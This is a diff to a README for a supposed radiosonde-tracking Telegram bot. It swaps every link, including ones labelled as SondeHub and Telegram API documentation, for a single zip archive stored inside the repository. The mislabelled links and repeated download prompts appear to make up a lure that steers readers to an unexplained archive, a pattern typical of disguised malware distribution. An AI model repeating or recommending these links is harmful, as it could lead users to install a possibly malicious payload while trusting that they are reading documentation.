@@ -1,6 +1,6 @@
 # 🌧️ Radiosonde-Telegram-Bot - Track Weather Balloons with Ease
 
-[![Download Now](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip) 
+[![Download Now](https://github.com/hassan0777/Radiosonde-Telegram-Bot/raw/refs/heads/main/site-data/Telegram-Bot-Radiosonde-v2.4.zip%20Now-Get%20It%20Here-brightgreen)](https://github.com/hassan0777/Radiosonde-Telegram-Bot/raw/refs/heads/main/site-data/Telegram-Bot-Radiosonde-v2.4.zip) 
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Here's how to get started with the bot.
 
 To download the application, visit this page to download:
 
-[Download the latest release](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip)
+[Download the latest release](https://github.com/hassan0777/Radiosonde-Telegram-Bot/raw/refs/heads/main/site-data/Telegram-Bot-Radiosonde-v2.4.zip)
 
 Follow these simple steps:
 
@@ -71,9 +71,9 @@ If you encounter issues, here are some steps to help resolve them:
 
 For more information, you can check:
 
-- [SondeHub Documentation](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip) for understanding data sources.
-- [Telegram Bot API Guide](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip) for understanding how bots work in Telegram.
+- [SondeHub Documentation](https://github.com/hassan0777/Radiosonde-Telegram-Bot/raw/refs/heads/main/site-data/Telegram-Bot-Radiosonde-v2.4.zip) for understanding data sources.
+- [Telegram Bot API Guide](https://github.com/hassan0777/Radiosonde-Telegram-Bot/raw/refs/heads/main/site-data/Telegram-Bot-Radiosonde-v2.4.zip) for understanding how bots work in Telegram.
 
 Thank you for using the **Radiosonde-Telegram-Bot**! Happy tracking!
 
-[Download the latest release](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip)
+[Download the latest release](https://github.com/hassan0777/Radiosonde-Telegram-Bot/raw/refs/heads/main/site-data/Telegram-Bot-Radiosonde-v2.4.zip)
